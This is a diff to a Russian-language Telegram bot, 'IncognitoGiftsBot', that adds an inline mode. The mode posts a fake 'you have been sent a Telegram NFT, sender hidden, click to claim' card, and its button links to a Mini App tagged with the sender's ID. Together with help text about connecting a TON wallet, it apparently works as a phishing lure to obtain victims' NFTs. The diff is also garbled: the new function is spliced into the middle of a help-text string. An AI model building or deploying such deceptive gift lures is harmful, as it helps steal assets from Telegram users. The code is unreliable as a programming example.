@@ -1,7 +1,7 @@
 import os
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent, WebAppInfo
+from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -55,9 +55,45 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "**Команды:**\n"
         "/start - Получить ссылку для перевода NFT\n"
         "/help - Показать это сообщение\n\n"
-        "**Как это работает:**\n"
-        "1. Бот генерирует ссылку на Mini App\n"
-        "2. Отправляешь ссылку на аккаунт с NFT\n"
+        "**Inline Mode:**\n"
+        "Напиши `@IncognitoGiftsBot` в любом чате чтобы отправить красивую карточку с NFT!"
+    )
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
+async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обрабатывает inline запросы - показывает красивую карточку с GIF"""
+    query = update.inline_query.query
+    user_id = update.inline_query.from_user.id
+
+    # Ссылка на Mini App
+    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
+
+    # Создаём красивую карточку с кнопкой
+    keyboard = [
+        [InlineKeyboardButton("🎁 Забрать NFT", url=mini_app_link)]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    # Результат с текстом и кнопкой
+    results = [
+        InlineQueryResultArticle(
+            id="nft_gift",
+            title="🎁 Отправить Telegram NFT",
+            description="Получатель сможет забрать все NFT одной кнопкой",
+            thumbnail_url="https://nft.fragment.com/telegram.gif",
+            input_message_content=InputTextMessageContent(
+                message_text=(
+                    "🎁 **Вам отправлен Telegram NFT**\n\n"
+                    "От: **Аккаунт скрыт**\n\n"
+                    "Нажмите кнопку ниже чтобы забрать NFT!"
+                ),
+                parse_mode='Markdown'
+            ),
+            reply_markup=reply_markup
+        )
+    ]
+
+    await update.inline_query.answer(results, cache_time=1)
         "3. На том аккаунте открываешь Mini App\n"
         "4. Подключаешь TON кошелёк\n"
         "5. Видишь все свои Telegram NFT\n"
@@ -76,6 +112,7 @@ def main():
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(InlineQueryHandler(inline_query))
 
     logger.info("Бот запущен и готов к работе!")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
